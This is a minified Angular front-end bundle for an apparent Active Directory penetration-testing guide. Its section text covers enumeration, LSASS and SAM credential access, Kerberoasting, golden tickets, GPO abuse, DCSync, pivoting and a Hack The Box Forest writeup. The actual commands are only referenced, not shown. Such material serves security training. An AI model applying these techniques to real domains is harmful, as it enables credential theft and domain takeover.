import{a as k,b as _,c as R,d as O,e as M,f as T,g as I,h as L}from"./chunk-SFRSLJCO.js";import"./chunk-GFLLK36M.js";import{$ as P,$a as C,A as S,B as x,Ea as t,F as y,La as u,U as a,Va as b,Wa as w,Za as A,ab as D,da as f,ka as i,la as n,ma as e,na as r,ra as d,sa as m,ta as E,ua as v,va as p,y as g}from"./chunk-FQT5HG3D.js";var H=()=>({section:"sqli"}),N=()=>({system:"windows"}),q=()=>({service:"compromise"}),W=()=>({service:"kerberos"}),z=()=>({service:"bloodhound"}),B=()=>({service:"acl"}),F=()=>({service:"shares"}),K=()=>({service:"spn"});function V(s,l){if(s&1&&(d(0),n(1,"h2"),t(2,"Windows Commands"),e(),n(3,"p",11),t(4," Use built-in Windows commands to enumerate domain users and groups. These commands are a useful starting point when working from a domain-joined Windows machine. "),e(),n(5,"mat-expansion-panel")(6,"mat-expansion-panel-header")(7,"mat-panel-title"),t(8,"Domain Users"),e()(),r(9,"app-terminal",12),e(),n(10,"mat-expansion-panel")(11,"mat-expansion-panel-header")(12,"mat-panel-title"),t(13,"Domain Groups"),e()(),r(14,"app-terminal",12),e(),m()),s&2){let o=p();a(9),i("command",o.windowsUsers),a(5),i("command",o.windowsGroups)}}function j(s,l){if(s&1&&(d(0),n(1,"h2"),t(2,"PowerView"),e(),n(3,"p",11),t(4," PowerView provides PowerShell functions for querying Active Directory. Use it to map the domain, enumerate accounts and inspect group memberships. "),e(),n(5,"mat-expansion-panel")(6,"mat-expansion-panel-header")(7,"mat-panel-title"),t(8,"Import & Domain Information"),e()(),r(9,"app-terminal",12),e(),n(10,"mat-expansion-panel")(11,"mat-expansion-panel-header")(12,"mat-panel-title"),t(13,"User Enumeration"),e()(),r(14,"app-terminal",12),e(),n(15,"mat-expansion-panel")(16,"mat-expansion-panel-header")(17,"mat-panel-title"),t(18,"Group Enumeration"),e()(),r(19,"app-terminal",12),e(),m()),s&2){let o=p();a(9),i("command",o.powerViewImport),a(5),i("command",o.powerViewUsers),a(5),i("command",o.powerViewGroups)}}function Q(s,l){if(s&1&&(d(0),n(1,"h2"),t(2,"Manual Enumeration"),e(),n(3,"p",11),t(4," Map domain computers, identify operating systems, discover where the current account has local administrator access and inspect active sessions. "),e(),n(5,"mat-expansion-panel")(6,"mat-expansion-panel-header")(7,"mat-panel-title"),t(8,"Computers & Operating Systems"),e()(),r(9,"app-terminal",12),e(),n(10,"mat-expansion-panel")(11,"mat-expansion-panel-header")(12,"mat-panel-title"),t(13,"Local Administrator Access"),e()(),r(14,"app-terminal",12),e(),n(15,"mat-expansion-panel")(16,"mat-expansion-panel-header")(17,"mat-panel-title"),t(18,"Sessions & Logged-on Users"),e()(),r(19,"app-terminal",12),e(),m()),s&2){let o=p();a(9),i("command",o.manualComputers),a(5),i("command",o.manualLocalAdmin),a(5),i("command",o.manualSessions)}}function Y(s,l){if(s&1&&(d(0),n(1,"h2"),t(2,"SPN Enumeration"),e(),n(3,"p",11),t(4," Service Principal Names identify services associated with domain accounts. Enumerating them can help identify accounts that warrant further assessment, including potential Kerberoasting exposure. "),e(),n(5,"mat-expansion-panel")(6,"mat-expansion-panel-header")(7,"mat-panel-title"),t(8,"Enumerate SPNs with setspn"),e()(),r(9,"app-terminal",12),e(),n(10,"mat-expansion-panel")(11,"mat-expansion-panel-header")(12,"mat-panel-title"),t(13,"Enumerate SPNs with PowerView"),e()(),r(14,"app-terminal",12),e(),n(15,"mat-expansion-panel")(16,"mat-expansion-panel-header")(17,"mat-panel-title"),t(18,"DNS Lookup"),e()(),r(19,"app-terminal",12),e(),m()),s&2){let o=p();a(9),i("command",o.spnSetspn),a(5),i("command",o.spnPowerView),a(5),i("command",o.spnDns)}}function $(s,l){if(s&1&&(d(0),n(1,"h2"),t(2,"Object Permissions"),e(),n(3,"p",11),t(4," Active Directory ACLs control which security principals can read or modify objects. Review delegated rights carefully to identify potentially significant permissions. "),e(),n(5,"mat-expansion-panel")(6,"mat-expansion-panel-header")(7,"mat-panel-title"),t(8,"Common Permission Types"),e()(),r(9,"app-terminal",12),e(),n(10,"mat-expansion-panel")(11,"mat-expansion-panel-header")(12,"mat-panel-title"),t(13,"Enumerate Object ACLs"),e()(),r(14,"app-terminal",12),e(),n(15,"mat-expansion-panel")(16,"mat-expansion-panel-header")(17,"mat-panel-title"),t(18,"Find GenericAll Permissions"),e()(),r(19,"app-terminal",12),e(),n(20,"mat-expansion-panel")(21,"mat-expansion-panel-header")(22,"mat-panel-title"),t(23,"Group Membership Changes"),e()(),r(24,"app-terminal",12),e(),n(25,"mat-expansion-panel")(26,"mat-expansion-panel-header")(27,"mat-panel-title"),t(28,"ACL Abuse Assessment: GenericAll, WriteDACL & WriteOwner"),e()(),r(29,"app-terminal",12),e(),m()),s&2){let o=p();a(9),i("command",o.aclRights),a(5),i("command",o.aclEnumeration),a(5),i("command",o.aclGenericAll),a(5),i("command",o.aclGroupMembership),a(5),i("command",o.aclAbuseWorkflow)}}function Z(s,l){if(s&1&&(d(0),n(1,"h2"),t(2,"Domain Shares"),e(),n(3,"p",11),t(4," Enumerate domain shares and review accessible files for configuration data, scripts or other information relevant to the assessment. "),e(),n(5,"mat-expansion-panel")(6,"mat-expansion-panel-header")(7,"mat-panel-title"),t(8,"Share Enumeration"),e()(),r(9,"app-terminal",12),e(),n(10,"mat-expansion-panel")(11,"mat-expansion-panel-header")(12,"mat-panel-title"),t(13,"Access SYSVOL"),e()(),r(14,"app-terminal",12),e(),n(15,"mat-expansion-panel")(16,"mat-expansion-panel-header")(17,"mat-panel-title"),t(18,"GPP Passwords"),e()(),r(19,"app-terminal",12),e(),m()),s&2){let o=p();a(9),i("command",o.sharesEnumeration),a(5),i("command",o.sharesAccess),a(5),i("command",o.sharesGpp)}}function X(s,l){if(s&1&&(d(0),n(1,"h2"),t(2,"BloodHound / SharpHound"),e(),n(3,"p",11),t(4," SharpHound collects Active Directory data. BloodHound visualizes the relationships between users, groups, computers, permissions and sessions to help identify potential attack paths. "),e(),n(5,"mat-expansion-panel")(6,"mat-expansion-panel-header")(7,"mat-panel-title"),t(8,"Overview & Useful Queries"),e()(),r(9,"app-terminal",12)(10,"app-terminal",12),e(),n(11,"mat-expansion-panel")(12,"mat-expansion-panel-header")(13,"mat-panel-title"),t(14,"Download SharpHound"),e()(),r(15,"app-terminal",12),e(),n(16,"mat-expansion-panel")(17,"mat-expansion-panel-header")(18,"mat-panel-title"),t(19,"SharpHound Collection (Windows)"),e()(),r(20,"app-terminal",12),e(),n(21,"mat-expansion-panel")(22,"mat-expansion-panel-header")(23,"mat-panel-title"),t(24,"PowerShell Collection"),e()(),r(25,"app-terminal",12),e(),n(26,"mat-expansion-panel")(27,"mat-expansion-panel-header")(28,"mat-panel-title"),t(29,"Start BloodHound (Kali)"),e()(),r(30,"app-terminal",12),e(),n(31,"mat-expansion-panel")(32,"mat-expansion-panel-header")(33,"mat-panel-title"),t(34,"Transfer Results from Evil-WinRM"),e()(),r(35,"app-terminal",12),e(),n(36,"p",11),t(37," After collecting the data, import the generated ZIP into BloodHound. Authenticate to the configured database and use the available analysis queries to explore the collected relationships. "),e(),m()),s&2){let o=p();a(9),i("command",o.bloodhoundOverview),a(),i("command",o.bloodhoundQueries),a(5),i("command",o.sharpHoundDownload),a(5),i("command",o.sharpHoundCollection),a(5),i("command",o.sharpHoundPowerShell),a(5),i("command",o.bloodhoundKali),a(5),i("command",o.bloodhoundTransfer)}}function J(s,l){if(s&1&&(d(0),n(1,"h2"),t(2,"Credential Access"),e(),n(3,"p",11),t(4," Assess where Windows stores authentication material, identify the privileges required to access it, and understand the impact of exposed credentials in an authorized environment. "),e(),n(5,"mat-expansion-panel")(6,"mat-expansion-panel-header")(7,"mat-panel-title"),t(8,"Security Context & Logged-on Users"),e()(),r(9,"app-terminal",12),e(),n(10,"mat-expansion-panel")(11,"mat-expansion-panel-header")(12,"mat-panel-title"),t(13,"LSASS & Logon Credentials"),e()(),r(14,"app-terminal",12),e(),n(15,"mat-expansion-panel")(16,"mat-expansion-panel-header")(17,"mat-panel-title"),t(18,"Cached Domain Credentials"),e()(),r(19,"app-terminal",12),e(),n(20,"mat-expansion-panel")(21,"mat-expansion-panel-header")(22,"mat-panel-title"),t(23,"Local SAM Database"),e()(),r(24,"app-terminal",12),e(),n(25,"mat-expansion-panel")(26,"mat-expansion-panel-header")(27,"mat-panel-title"),t(28,"LSA Secrets"),e()(),r(29,"app-terminal",12),e(),n(30,"mat-expansion-panel")(31,"mat-expansion-panel-header")(32,"mat-panel-title"),t(33,"Credential Manager & Windows Vault"),e()(),r(34,"app-terminal",12),e(),n(35,"mat-expansion-panel")(36,"mat-expansion-panel-header")(37,"mat-panel-title"),t(38,"DPAPI"),e()(),r(39,"app-terminal",12),e(),n(40,"mat-expansion-panel")(41,"mat-expansion-panel-header")(42,"mat-panel-title"),t(43,"Domain Controller Credential Exposure"),e()(),r(44,"app-terminal",12),e(),n(45,"mat-expansion-panel")(46,"mat-expansion-panel-header")(47,"mat-panel-title"),t(48,"Credential Hunting Workflow"),e()()(),m()),s&2){let o=p();a(9),i("command",o.attackCredentialOverview),a(5),i("command",o.attackLsass),a(5),i("command",o.attackCachedCredentials),a(5),i("command",o.attackSam),a(5),i("command",o.attackLsaSecrets),a(5),i("command",o.attackCredentialManager),a(5),i("command",o.attackDpapi),a(5),i("command",o.attackNtds)}}function ee(s,l){if(s&1&&(d(0),n(1,"h2"),t(2,"Kerberos Attacks"),e(),n(3,"p",11),t(4," Understand Kerberos authentication, identify accounts exposed to ticket-based attacks, and assess the security of service accounts and ticket handling. Use the commands only in an authorized lab; check lockout policy before authentication tests and protect exported tickets. "),e(),n(5,"mat-expansion-panel")(6,"mat-expansion-panel-header")(7,"mat-panel-title"),t(8,"AS-REP Roasting"),e()(),r(9,"app-terminal",12),e(),n(10,"mat-expansion-panel")(11,"mat-expansion-panel-header")(12,"mat-panel-title"),t(13,"Kerberoasting"),e()(),r(14,"app-terminal",12),e(),n(15,"mat-expansion-panel")(16,"mat-expansion-panel-header")(17,"mat-panel-title"),t(18,"Kerbrute: User Enumeration & Password Spray"),e()(),r(19,"app-terminal",12),e(),n(20,"mat-expansion-panel")(21,"mat-expansion-panel-header")(22,"mat-panel-title"),t(23,"Delegation: Unconstrained & Constrained"),e()(),r(24,"app-terminal",12),e(),n(25,"mat-expansion-panel")(26,"mat-expansion-panel-header")(27,"mat-panel-title"),t(28,"Resource-Based Constrained Delegation (RBCD)"),e()(),r(29,"app-terminal",12),e(),n(30,"mat-expansion-panel")(31,"mat-expansion-panel-header")(32,"mat-panel-title"),t(33,"Ticket Enumeration"),e()(),r(34,"app-terminal",12),e(),n(35,"mat-expansion-panel")(36,"mat-expansion-panel-header")(37,"mat-panel-title"),t(38,"Pass-the-Ticket"),e()(),r(39,"app-terminal",12),e(),n(40,"mat-expansion-panel")(41,"mat-expansion-panel-header")(42,"mat-panel-title"),t(43,"Golden Tickets"),e()(),r(44,"app-terminal",12),e(),n(45,"mat-expansion-panel")(46,"mat-expansion-panel-header")(47,"mat-panel-title"),t(48,"Silver Tickets"),e()(),r(49,"app-terminal",12),e(),m()),s&2){let o=p();a(9),i("command",o.attackAsrep),a(5),i("command",o.attackKerberoast),a(5),i("command",o.attackKerbrute),a(5),i("command",o.attackDelegation),a(5),i("command",o.attackRbcd),a(5),i("command",o.attackTicketEnumeration),a(5),i("command",o.attackPassTheTicket),a(5),i("command",o.attackGoldenTicket),a(5),i("command",o.attackSilverTicket)}}function te(s,l){if(s&1&&(d(0),n(1,"h2"),t(2,"Password Attacks"),e(),n(3,"p",11),t(4," Assess password policy and authentication weaknesses while respecting account lockout thresholds, test scope and approved authentication-attempt limits. "),e(),n(5,"mat-expansion-panel")(6,"mat-expansion-panel-header")(7,"mat-panel-title"),t(8,"Password & Lockout Policy"),e()(),r(9,"app-terminal",12),e(),n(10,"mat-expansion-panel")(11,"mat-expansion-panel-header")(12,"mat-panel-title"),t(13,"LDAP & ADSI Authentication"),e()(),r(14,"app-terminal",12),e(),n(15,"mat-expansion-panel")(16,"mat-expansion-panel-header")(17,"mat-panel-title"),t(18,"Password Spraying"),e()(),r(19,"app-terminal",12),e(),n(20,"mat-expansion-panel")(21,"mat-expansion-panel-header")(22,"mat-panel-title"),t(23,"SMB Authentication \u2014 Kali"),e()(),r(24,"app-terminal",12),e(),n(25,"mat-expansion-panel")(26,"mat-expansion-panel-header")(27,"mat-panel-title"),t(28,"Kerbrute \u2014 Authentication Testing"),e()(),r(29,"app-terminal",12),e(),m()),s&2){let o=p();a(9),i("command",o.attackPasswordPolicy),a(5),i("command",o.attackCredentialValidation),a(5),i("command",o.attackPasswordSpray),a(5),i("command",o.attackSmbValidation),a(5),i("command",o.attackKerbrute)}}function ne(s,l){if(s&1&&(d(0),n(1,"h2"),t(2,"Active Directory Certificate Services (ADCS)"),e(),n(3,"p",11),t(4," Review certificate authorities, templates and enrollment permissions for misconfigurations. Template changes and certificate requests are limited to explicitly authorized lab validation. "),e(),n(5,"mat-expansion-panel")(6,"mat-expansion-panel-header")(7,"mat-panel-title"),t(8,"ADCS Overview & Assessment Scope"),e()(),r(9,"app-terminal",12),e(),n(10,"mat-expansion-panel")(11,"mat-expansion-panel-header")(12,"mat-panel-title"),t(13,"Enumerate CAs & Vulnerable Templates"),e()(),r(14,"app-terminal",12),e(),n(15,"mat-expansion-panel")(16,"mat-expansion-panel-header")(17,"mat-panel-title"),t(18,"ESC4: Template Permission Review"),e()(),r(19,"app-terminal",12),e(),n(20,"mat-expansion-panel")(21,"mat-expansion-panel-header")(22,"mat-panel-title"),t(23,"Certificate Request, SID & Authentication"),e()(),r(24,"app-terminal",12)(25,"app-terminal",12),e(),m()),s&2){let o=p();a(9),i("command",o.adcsOverview),a(5),i("command",o.adcsEnumeration),a(5),i("command",o.adcsTemplateReview),a(5),i("command",o.adcsCertificateRequest),a(),i("command",o.adcsCertificateAuth)}}function ae(s,l){if(s&1&&(d(0),n(1,"h2"),t(2,"DCOM Lateral Movement"),e(),n(3,"p",11),t(4," DCOM may provide remote command execution when the authenticated account has the required host permissions and RPC is reachable. It does not grant additional privileges by itself. "),e(),n(5,"mat-expansion-panel")(6,"mat-expansion-panel-header")(7,"mat-panel-title"),t(8,"Requirements, Enumeration & Controlled Validation"),e()(),r(9,"app-terminal",12),e(),m()),s&2){let o=p();a(9),i("command",o.attackDcom)}}function ie(s,l){if(s&1&&(d(0),n(1,"h2"),t(2,"GPO Abuse"),e(),n(3,"p",11),t(4," If the current principal has edit rights (GenericWrite / WriteProperty / WriteDacl) over a Group Policy Object, an immediate scheduled task or startup script can be pushed to every computer or user in that GPO's scope \u2014 often resulting in domain-wide or OU-wide local administrator access. "),e(),n(5,"mat-expansion-panel")(6,"mat-expansion-panel-header")(7,"mat-panel-title"),t(8,"Enumerate Editable GPOs"),e()(),r(9,"app-terminal",12),e(),n(10,"mat-expansion-panel")(11,"mat-expansion-panel-header")(12,"mat-panel-title"),t(13,"Abuse with SharpGPOAbuse"),e()(),r(14,"app-terminal",12),e(),n(15,"mat-expansion-panel")(16,"mat-expansion-panel-header")(17,"mat-panel-title"),t(18,"Alternative: PowerView Immediate Task"),e()(),r(19,"app-terminal",12),n(20,"p"),t(21," Policy changes only take effect on hosts within the GPO's linked OU scope and after a refresh (forced with "),n(22,"code"),t(23,"gpupdate /force"),e(),t(24," or the default ~90\u2013120 minute client interval). Always confirm scope, security filtering and WMI filters before relying on this technique against a specific host. "),e()(),m()),s&2){let o=p();a(9),i("command",o.gpoEnumeration),a(5),i("command",o.gpoAbuseSharpGpo),a(5),i("command",o.gpoImmediateTask)}}function oe(s,l){if(s&1&&(d(0),n(1,"h2"),t(2,"Domain Compromise"),e(),n(3,"p",11),t(4," Evaluate high-impact Active Directory privileges, understand directory replication abuse, and document the exposure and remediation of privileged credentials. "),e(),n(5,"mat-expansion-panel")(6,"mat-expansion-panel-header")(7,"mat-panel-title"),t(8,"DCSync Prerequisites"),e()(),r(9,"app-terminal",12),e(),n(10,"mat-expansion-panel")(11,"mat-expansion-panel-header")(12,"mat-panel-title"),t(13,"DCSync Detection & Remediation"),e()(),r(14,"app-terminal",12),e(),m()),s&2){let o=p();a(9),i("command",o.attackDcsyncRequirements),a(5),i("command",o.attackDcsyncDetection)}}function re(s,l){if(s&1){let o=E();d(0),n(1,"h2"),t(2,"AD Set Flow"),e(),n(3,"p",11),t(4," Follow a structured Active Directory workflow, from port scanning and initial access to privilege escalation, post-compromise enumeration and pivoting. "),e(),n(5,"mat-expansion-panel")(6,"mat-expansion-panel-header")(7,"mat-panel-title"),t(8,"01. Scan & Service Enumeration"),e()(),r(9,"app-terminal",12)(10,"app-terminal",12),e(),n(11,"mat-expansion-panel")(12,"mat-expansion-panel-header")(13,"mat-panel-title"),t(14,"02. Access to the Server"),e()(),r(15,"app-terminal",12)(16,"app-terminal",12),e(),n(17,"mat-expansion-panel")(18,"mat-expansion-panel-header")(19,"mat-panel-title"),t(20,"03. Domain & Host Enumeration"),e()(),r(21,"app-terminal",12)(22,"app-terminal",12)(23,"app-terminal",12)(24,"app-terminal",12)(25,"app-terminal",12)(26,"app-terminal",12)(27,"app-terminal",12),e(),n(28,"mat-expansion-panel")(29,"mat-expansion-panel-header")(30,"mat-panel-title"),t(31,"04. Privilege Escalation"),e()(),r(32,"app-terminal",12)(33,"app-terminal",12),e(),n(34,"mat-expansion-panel")(35,"mat-expansion-panel-header")(36,"mat-panel-title"),t(37,"05. Post-Compromise Workflow"),e()(),r(38,"app-terminal",12)(39,"app-terminal",12)(40,"app-terminal",12)(41,"app-terminal",12),e(),n(42,"mat-expansion-panel")(43,"mat-expansion-panel-header")(44,"mat-panel-title"),t(45,"06. Pivoting with Ligolo-ng"),e()(),r(46,"app-terminal",12)(47,"app-terminal",12),e(),n(48,"mat-expansion-panel")(49,"mat-expansion-panel-header")(50,"mat-panel-title"),t(51,"07. Post-Pivoting Enumeration"),e()(),r(52,"app-terminal",12),e(),n(53,"mat-expansion-panel",13),v("opened",function(){S(o);let h=p();return x(h.selectedFlowPhase="post-exploitation")})("closed",function(){S(o);let h=p();return x(h.selectedFlowPhase="")}),n(54,"mat-expansion-panel-header")(55,"mat-panel-title"),t(56,"08. Post-Exploitation & Handoff"),e()(),n(57,"p",11),t(58," Reassess the current host after gaining an authorized administrative context. Keep credential use within scope and avoid changing target configuration unnecessarily. "),e(),n(59,"h3"),t(60,"Situational Awareness"),e(),r(61,"app-terminal",12),n(62,"h3"),t(63,"Credential Sources & Handling"),e(),r(64,"app-terminal",12)(65,"app-terminal",12),n(66,"h3"),t(67,"Choose the Next Path"),e(),r(68,"app-terminal",12),n(69,"p",11),t(70," For Kerberos tickets, SPNs and delegation, use Kerberos Attacks. For ACL paths, use Object Permissions and BloodHound. Pivoting and MSSQL are covered above. "),e(),n(71,"h3"),t(72,"Optional: Local Administrator Access"),e(),n(73,"p",11),t(74," This modifies the target's local Administrators group. Use only when the lab or engagement explicitly permits changing group membership. "),e(),r(75,"app-terminal",12),n(76,"h3"),t(77,"Closeout & Remediation"),e(),r(78,"app-terminal",12),e(),m()}if(s&2){let o=p();a(9),i("command",o.flowScan),a(),i("command",o.flowServices),a(5),i("command",o.flowWinRM),a(),i("command",o.flowHostEnumeration),a(5),i("command",o.manualComputers),a(),i("command",o.manualLocalAdmin),a(),i("command",o.manualSessions),a(),i("command",o.spnSetspn),a(),i("command",o.spnPowerView),a(),i("command",o.spnDns),a(),i("command",o.aclRights),a(5),i("command",o.flowPrivEscChecks),a(),i("command",o.flowPrivEscReview),a(5),i("command",o.flowPostCompromise),a(),i("command",o.flowCredentialAudit),a(),i("command",o.flowKerberosAudit),a(),i("command",o.flowMssqlAudit),a(5),i("command",o.flowPivotEnumeration),a(),i("command",o.flowLigolo),a(5),i("command",o.flowPostPivot),a(),i("expanded",o.selectedFlowPhase==="post-exploitation"),a(8),i("command",o.postExploitSituationalAwareness),a(3),i("command",o.flowCredentialAudit),a(),i("command",o.postExploitCredentialRecovery),a(3),i("command",o.postExploitCredentialRoutes),a(7),i("command",o.postExploitAdminGroupAccess),a(3),i("command",o.attackPostCompromise)}}function se(s,l){if(s&1&&(d(0),n(1,"h2"),t(2,"Post-Compromise Checklist"),e(),n(3,"p",11),t(4," Repeat this host-focused review after authorized Administrator or SYSTEM access on a domain machine. Protect recovered credentials and keep all validation in scope. "),e(),n(5,"mat-expansion-panel")(6,"mat-expansion-panel-header")(7,"mat-panel-title"),t(8,"Quick Checklist & Active Sessions"),e()(),r(9,"app-terminal",12)(10,"app-terminal",12),e(),n(11,"mat-expansion-panel")(12,"mat-expansion-panel-header")(13,"mat-panel-title"),t(14,"LSASS, Kerberos, DPAPI & Credential Manager"),e()(),r(15,"app-terminal",12),e(),n(16,"mat-expansion-panel")(17,"mat-expansion-panel-header")(18,"mat-panel-title"),t(19,"User Profiles, Scheduled Tasks, Services & Configurations"),e()(),r(20,"app-terminal",12),e(),n(21,"mat-expansion-panel")(22,"mat-expansion-panel-header")(23,"mat-panel-title"),t(24,"Certificates, BloodHound, Delegation & LAPS"),e()(),r(25,"app-terminal",12),e(),n(26,"mat-expansion-panel")(27,"mat-expansion-panel-header")(28,"mat-panel-title"),t(29,"Decision Tree, Next Actions & Closeout"),e()(),r(30,"app-terminal",12),e(),m()),s&2){let o=p();a(9),i("command",o.postChecklistQuick),a(),i("command",o.postChecklistSessions),a(5),i("command",o.postChecklistCredentials),a(5),i("command",o.postChecklistHostAudit),a(5),i("command",o.postChecklistDirectory),a(5),i("command",o.postChecklistDecision)}}function ce(s,l){if(s&1&&(d(0),n(1,"h2"),t(2,"Example: Three-Host Domain Chain"),e(),n(3,"p",11),t(4," Fictional authorized lab walkthrough (domain "),n(5,"code"),t(6,"CORP.LOCAL"),e(),t(7,"): WEB01 (10.10.10.21, DMZ) is reached through a SQL injection, a PowerShell history leak leads to APP02 (10.10.20.22, internal segment), a local escalation on APP02 exposes a service account valid on APP03 (10.10.30.23) that already holds directory replication rights. Two separate pivots are required, since neither APP02 nor APP03 is directly reachable from Kali. "),e(),n(8,"mat-accordion",14)(9,"mat-expansion-panel")(10,"mat-expansion-panel-header")(11,"mat-panel-title"),t(12,"01. WEB01: Initial Access Through SQL Injection"),e()(),n(13,"p"),t(14," In this fictional lab, the application exposes a SQL injection that leads to command execution in the web service context. SQL injection does not guarantee a shell; the result depends on the database, privileges and application setup. "),e(),n(15,"a",15),t(16," Open the existing Web \u2192 SQL Injection guide "),e()(),n(17,"mat-expansion-panel")(18,"mat-expansion-panel-header")(19,"mat-panel-title"),t(20,"02. WEB01: Establish Host Context"),e()(),n(21,"p"),t(22," Record identity, privileges, domain and network position. In this lab, the SQLi shell lands as the low-privileged "),n(23,"code"),t(24,"CORP\\svc_web"),e(),t(25," service account. "),e(),r(26,"app-terminal",12),e(),n(27,"mat-expansion-panel")(28,"mat-expansion-panel-header")(29,"mat-panel-title"),t(30,"03. WEB01: PowerShell History & Local Escalation"),e()(),n(31,"p"),t(32," Review the PowerShell history before anything else; it is one of the fastest ways to find leftover administrative activity. Finding a password in history alone does not elevate the current token, so validate the actual local privilege path with the existing Windows PrivEsc material. "),e(),r(33,"app-terminal",12)(34,"app-terminal",12),n(35,"a",16),t(36," Open Windows PrivEsc, including PowerShell History and SeImpersonate checks "),e()(),n(37,"mat-expansion-panel")(38,"mat-expansion-panel-header")(39,"mat-panel-title"),t(40,"04. WEB01: Post-Exploitation & LSASS Assessment"),e()(),n(41,"p"),t(42,"After authorized elevation, reassess the host and handle recovered secrets carefully."),e(),r(43,"app-terminal",12)(44,"app-terminal",12),e(),n(45,"mat-expansion-panel")(46,"mat-expansion-panel-header")(47,"mat-panel-title"),t(48,"05. Pivot: WEB01 \u2192 APP02"),e()(),n(49,"p"),t(50," APP02 sits on the internal 10.10.20.0/24 segment, which WEB01 can reach but Kali cannot. This is the first of two pivots in this chain: tunnel through WEB01 before touching APP02 at all. "),e(),r(51,"app-terminal",12),e(),n(52,"mat-expansion-panel")(53,"mat-expansion-panel-header")(54,"mat-panel-title"),t(55,"06. APP02: Connect With the Recovered Credential"),e()(),n(56,"p"),t(57," Through the WEB01 tunnel, authenticate to APP02 using the fictional "),n(58,"code"),t(59,"svc_backup"),e(),t(60," credential recovered from the PowerShell history. "),e(),r(61,"app-terminal",12)(62,"app-terminal",12),e(),n(63,"mat-expansion-panel")(64,"mat-expansion-panel-header")(65,"mat-panel-title"),t(66,"07. APP02: Local Escalation & APP03 Credential"),e()(),n(67,"p"),t(68," In this scenario, an authorized local escalation path on APP02 (backup privileges) exposes a credential later used for APP03. Confirm the host's actual privilege findings in the existing Windows PrivEsc section rather than assuming any single artifact elevates you. "),e(),n(69,"a",16),t(70," Open Windows PrivEsc guidance "),e(),r(71,"app-terminal",12),e(),n(72,"mat-expansion-panel")(73,"mat-expansion-panel-header")(74,"mat-panel-title"),t(75,"08. Pivot: APP02 \u2192 APP03 (Internal Subnet)"),e()(),n(76,"p"),t(77," This is the second pivot of the chain. In this lab, APP02 has a route to APP03 and the domain controller that Kali still cannot reach directly. Start a fresh Ligolo-ng session from APP02, select it and configure the authorized subnet route. "),e(),r(78,"app-terminal",12)(79,"app-terminal",12),n(80,"p"),t(81,"Verify the tunnel route before continuing to APP03."),e(),r(82,"app-terminal",12),e(),n(83,"mat-expansion-panel")(84,"mat-expansion-panel-header")(85,"mat-panel-title"),t(86,"09. APP03: Connect Through the Tunnel"),e()(),n(87,"p"),t(88," After validating the fictional "),n(89,"code"),t(90,"svc_adcs"),e(),t(91," credential recovered on APP02, connect to APP03 through the newly established tunnel. "),e(),r(92,"app-terminal",12)(93,"app-terminal",12),e(),n(94,"mat-expansion-panel")(95,"mat-expansion-panel-header")(96,"mat-panel-title"),t(97,"10. APP03: Verify Replication Rights & Assess the DC"),e()(),n(98,"p"),t(99," The fictional "),n(100,"code"),t(101,"svc_adcs"),e(),t(102," account already has the required directory replication rights. Local Administrator membership alone does not grant DCSync. Confirm authorization, effective rights and target scope before using the existing procedure. "),e(),r(103,"app-terminal",12)(104,"app-terminal",12)(105,"app-terminal",12)(106,"app-terminal",12),n(107,"a",17),t(108," Open Domain Compromise prerequisites and detection "),e()(),n(109,"mat-expansion-panel")(110,"mat-expansion-panel-header")(111,"mat-panel-title"),t(112,"11. Closeout"),e()(),r(113,"app-terminal",12),e()(),m()),s&2){let o=p();a(15),i("queryParams",u(23,H)),a(11),i("command",o.flowHostEnumeration),a(7),i("command",o.examplePowerShellHistory),a(),i("command",o.flowPrivEscChecks),a(),i("queryParams",u(24,N)),a(8),i("command",o.postExploitSituationalAwareness),a(),i("command",o.postExploitCredentialRecovery),a(7),i("command",o.exampleWebToAppPivot),a(10),i("command",o.exampleApp02Login),a(),i("command",o.flowHostEnumeration),a(7),i("queryParams",u(25,N)),a(2),i("command",o.exampleApp02CredentialFinding),a(7),i("command",o.flowPivotEnumeration),a(),i("command",o.flowLigolo),a(3),i("command",o.flowPostPivot),a(10),i("command",o.exampleApp03Login),a(),i("command",o.flowHostEnumeration),a(10),i("command",o.attackDcsyncRequirements),a(),i("command",o.attackNtds),a(),i("command",o.exampleDcsyncFinding),a(),i("command",o.attackDcsyncDetection),a(),i("queryParams",u(26,q)),a(6),i("command",o.attackPostCompromise)}}function le(s,l){if(s&1&&(d(0),n(1,"h2"),t(2,"HTB Forest: Active Directory Writeup"),e(),n(3,"p",11),t(4," Forest is a Windows domain-controller lab. This walkthrough summarizes the reasoning and privilege path; use it only in the retired Hack The Box machine or another explicitly authorized environment. "),e(),n(5,"mat-accordion",14)(6,"mat-expansion-panel")(7,"mat-expansion-panel-header")(8,"mat-panel-title"),t(9,"01. Reconnaissance & Domain Enumeration"),e()(),n(10,"p"),t(11," The exposed directory services identify the host as a domain controller. Anonymous domain enumeration reveals the domain context and a useful set of user accounts. Record the domain name and validate each account before selecting an attack path. "),e(),r(12,"app-terminal",12),e(),n(13,"mat-expansion-panel")(14,"mat-expansion-panel-header")(15,"mat-panel-title"),t(16,"02. Check the Kerberos Pre-Authentication Setting"),e()(),n(17,"p"),t(18," Check the directory flag for accounts that do not require Kerberos pre-authentication. In this lab the finding is "),n(19,"code"),t(20,"svc-alfresco"),e(),t(21,". The query below is read-only and identifies the misconfiguration without requesting ticket material. "),e(),r(22,"app-terminal",12),n(23,"a",17),t(24," Review the Kerberos assessment guide "),e()(),n(25,"mat-expansion-panel")(26,"mat-expansion-panel-header")(27,"mat-panel-title"),t(28,"03. Validate Access & User Proof"),e()(),n(29,"p"),t(30," After obtaining an authorized lab credential through the platform's own exercise flow, verify the account and its scope before connecting. Keep passwords out of shell history and notes; retrieve the user proof only within the retired machine. "),e()(),n(31,"mat-expansion-panel")(32,"mat-expansion-panel-header")(33,"mat-panel-title"),t(34,"04. Review Group Memberships & Directory ACLs"),e()(),n(35,"p"),t(36," With authorized domain credentials, inspect the relevant memberships and use BloodHound to review the effective ACL path. In the lab, investigate "),n(37,"code"),t(38,"Account Operators"),e(),t(39,", "),n(40,"code"),t(41,"Exchange Windows Permissions"),e(),t(42,", and the domain object's replication-related rights. The commands below perform directory reads only. "),e(),r(43,"app-terminal",12),n(44,"a",17),t(45," Review BloodHound relationship analysis "),e(),n(46,"a",17),t(47," Review Active Directory ACLs "),e()(),n(48,"mat-expansion-panel")(49,"mat-expansion-panel-header")(50,"mat-panel-title"),t(51,"05. Confirm Impact & Root Proof"),e()(),n(52,"p"),t(53," If the ACL review confirms replication privileges, document the impact and validate the lab's root proof using the authorized exercise process. This walkthrough intentionally omits commands that alter directory permissions or extract domain credential material. "),e()(),n(54,"mat-expansion-panel")(55,"mat-expansion-panel-header")(56,"mat-panel-title"),t(57,"Key Lessons & Defensive 